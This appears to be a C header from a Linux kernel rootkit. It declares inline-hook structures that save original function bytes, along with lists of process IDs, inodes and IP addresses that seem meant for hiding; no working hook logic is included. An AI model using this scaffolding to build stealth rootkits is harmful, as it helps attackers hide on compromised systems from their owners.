#ifndef __KERNEL_H
#define __KERNEL_H

#include <arch.h>
#include <defs.h>
#include <cdefs.h>
#include <kdefs.h>

#pragma GCC visibility push(protected)

#ifdef CONFIG_UP
#define SPIN_LOCK_IRQ   irq_disable
#define SPIN_UNLOCK_IRQ irq_restore
#else
#define SPIN_LOCK_IRQ   spin_lock_irq
#define SPIN_UNLOCK_IRQ spin_unlock_irq
#endif

#define SPIN_LOCK(lock,flags)                   \
        do {                                    \
                flags = SPIN_LOCK_IRQ(lock);    \
        } while (0)
#define SPIN_UNLOCK(lock, flags)                \
        do {                                    \
                SPIN_UNLOCK_IRQ(lock,flags);    \
        } while (0)

#define get_fs()  (((struct thread_info *)current_thread_info())->addr_limit)
#define set_fs(x) (((struct thread_info *)current_thread_info())->addr_limit = (x))

struct m_cache {
        unsigned long      objsize;
        unsigned long      freemap;
        spinlock_t         lock;
        void              *page;
        struct list_head   list;
};

#define RKHOOK(x, f) \
({ \
	struct rkhook *rk = &rkhooks[x]; \
	rk->f(rk); \
})

struct rkhook {
	void *ptr;
	void *jmp;
	char org[FHOOKSZ];
	void (*e)(struct rkhook *);
	void (*d)(struct rkhook *);
};

#define MAXHOOKS 32

struct tracemap {
	struct rktrace     hooks[MAXHOOKS];
	int                nsegs;
	int                pid;
	struct list_head   list;
};

struct rkproc {
	unsigned int       pid;
	struct list_head   list;
};

struct rkinode {
	uint64_t           inode;
	struct list_head   list;
};

struct rkipaddr4 {
	unsigned int       ipaddr;
	struct list_head   list;
};

struct rkipaddr6 {
	char               ipaddr[16];
	struct list_head   list;
};

#endif
